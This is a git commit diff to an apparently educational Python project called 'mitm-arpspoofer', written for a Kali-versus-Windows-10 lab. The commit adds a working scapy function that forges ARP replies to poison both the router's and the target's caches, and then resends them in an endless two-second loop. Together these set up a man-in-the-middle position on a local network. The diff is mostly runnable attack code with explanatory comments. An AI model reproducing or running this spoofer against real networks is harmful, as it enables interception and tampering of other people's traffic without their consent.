c5313112dbdee8079002276c6b4ed16fffe7d7c7
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-06-29 08:17:03 +0530

    Update arpspoofer.py
    spoofing functionality added.

--- mitm-arpspoofer/arpspoofer.py
+++ mitm-arpspoofer/arpspoofer.py
@@ -11,6 +11,11 @@ def get_mac_address(ipaddr):
 	return answer[0][1].hwsrc # extracting MAC address from the answer
 	# This is how we grab the MAC address, refer the networking screenshot for better understanding.
 
+def spoof(router_ip, target_ip, router_mac, target_mac):
+	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip) # Sppofs the router. Normally the psrc will be the Kali IP (ip addr of machine that's sending the packet), to make this malicious & we specify the psrc as the target ip, so that we can send this packet to the router & make it seems it came from the target(Win 10) machine.
+	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip) # Spoofs the target Machine. Same concept applies here too, we want to send this packet to the Win 10 machine & make it seem it came from the router.
+	scapy.send(packet1)
+	scapy.send(packet2)
 
 def main():
 	if len(sys.argv) != 3:
@@ -24,6 +29,14 @@ def main():
 
 		print(router_mac)
 		print(target_mac)
+
+		try:
+			while True: # The mac addresses will be automatically reset after a few seconds, so we use infinite loop.
+				spoof(router_ip, target_ip, router_mac, target_mac)
+				time.sleep(2)
+		except KeyboardInterrupt:
+			print("Closing the ARP Spoofer!...")
+			exit(0)
 
 
 if __name__ == "__main__":
